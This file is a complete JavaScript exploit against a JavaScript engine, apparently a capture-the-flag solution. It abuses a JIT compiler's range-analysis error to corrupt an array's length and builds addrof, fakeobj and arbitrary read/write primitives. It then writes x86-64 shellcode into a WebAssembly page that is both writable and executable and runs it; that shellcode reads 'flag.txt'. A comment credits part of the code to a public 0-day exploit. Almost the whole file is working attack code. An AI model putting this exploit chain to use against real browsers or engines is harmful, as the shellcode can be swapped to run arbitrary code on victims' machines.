var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11])
var wasm_mod = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_mod);
var f = wasm_instance.exports.main;

var buf = new ArrayBuffer(8);
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);
let buf2 = new ArrayBuffer(0x150);

function ftoi(val) {
    f64_buf[0] = val;
    return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n);
}

function itof(val) {
    u64_buf[0] = Number(val & 0xffffffffn);
    u64_buf[1] = Number(val >> 32n);
    return f64_buf[0];
}

function dp(obj){
	//%DebugPrint(obj);
}

function dpb(obj){
  //%DebugPrint(obj);
  //%SystemBreak();
}

function foo(b) {
  var x = -0;
  var y = -0x80000000;

  //need this so that the typer will create the right range
  if (b) {
    x = -1;
    y = 1;
  }

  //x = -0, y = -0x80000000
  //actual = 0x80000000, inferred = -0x80000000
  //true: z = -2 
  var z = x - y;

  //actual = 0x80000000, inferred = -0x80000000
  //range = (-2, 0x80000000)
  //need to do a +0 here, to remove the MinusZero from the type
  //true: z = -2
  z = z + 0;

  //actual = 2147483648, inferred = -4
  //true: z = -2
  //range: (-2, 2147483648)
  z = Math.max(z, -4);

  //To narrow down the range
  z = -z; 

  //actual = -4, inferred = 4
  //true = 2
  //range: (-4, 2)
  z = Math.max(z, -4);

  z = z + 0;

  //actual = -1, inferred = 1
  //true = 0
  //range: (-1, 0)
  z = z >> 2;

  //Final intention intention: actual = -1, inferred = 1
  let arr = Array(z);
  arr.shift();
  let cor = [1.1, 1.2, 1.3];

  return [arr, cor];

}

for(let i = 0; i < 0x10000; i++) 
  foo(true);

let a = foo(false);

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//from here on its just taken from here:
//https://github.com/r4j0x00/exploits/blob/master/chrome-0day/exploit.js

var arr = a[0];
var cor = a[1];

const idx = 6;
arr[idx+10] = 0x4242;

function addrof(k) {
    arr[idx+1] = k;
    return ftoi(cor[0]) & 0xffffffffn;
}

function fakeobj(k) {
    cor[0] = itof(k);
    return arr[idx+1];
}

var float_array_map = ftoi(cor[3]);

var arr2 = [itof(float_array_map), 1.2, 2.3, 3.4];
var fake = fakeobj(addrof(arr2) + 0x20n);

function arbread(addr) {
    if (addr % 2n == 0) {
        addr += 1n;
    }
    arr2[1] = itof((2n << 32n) + addr - 8n);
    return (fake[0]);
}

function arbwrite(addr, val) {
    if (addr % 2n == 0) {
        addr += 1n;
    }
    arr2[1] = itof((2n << 32n) + addr - 8n);
    fake[0] = itof(BigInt(val));
}

function copy_shellcode(addr, shellcode) {
    let dataview = new DataView(buf2);
    let buf_addr = addrof(buf2);
    let backing_store_addr = buf_addr + 0x14n;
    arbwrite(backing_store_addr, addr);

    for (let i = 0; i < shellcode.length; i++) {
      dataview.setUint8(i, shellcode[i], true);
    }
}

var rwx_page_addr = ftoi(arbread(addrof(wasm_instance) + 0x68n));
console.log("[+] Address of rwx page: " + rwx_page_addr.toString(16));
var shellcode = [ 0xe8,0x09,0x00,0x00,0x00,0x66,0x6c,0x61,0x67,0x2e,0x74,0x78,0x74,0x00,0x5f,0x48,0x31,0xc0,0x04,0x02,0x48,0x31,0xf6,0x0f,0x05,0x66,0x81,0xec,0xff,0x0f,0x48,0x8d,0x34,0x24,0x48,0x89,0xc7,0x48,0x31,0xd2,0x66,0xba,0xff,0x0f,0x48,0x31,0xc0,0x0f,0x05,0x48,0x31,0xff,0x40,0x80,0xc7,0x01,0x48,0x89,0xc2,0x48,0x31,0xc0,0x04,0x01,0x0f,0x05]
copy_shellcode(rwx_page_addr, shellcode);
f();
